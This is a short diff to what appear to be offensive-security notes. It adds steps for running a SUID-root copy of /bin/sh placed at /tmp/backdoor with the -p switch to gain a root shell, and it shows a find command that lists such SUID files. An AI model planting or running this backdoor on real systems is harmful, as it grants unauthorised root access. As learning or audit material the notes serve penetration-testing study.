@@ -9,6 +9,10 @@ cp /bin/sh /tmp/backdoor
 chmod 4111 /tmp/backdoor #set the SUID bit, making the file run with owner permissions rather than user permissions
 ls -l /tmp/backdoor
 ---s--x--x #S = SUID bit
+/tmp/backdoor -p #some systems need to run with -p switch to force to honor SUID bit
+#whoami
+#root #if successful will get root access
+
 find /tmp -uid 0 -perm -4000 -print #find all files in tmp dir with owner root (uid 0) and SUID bit set
 
 
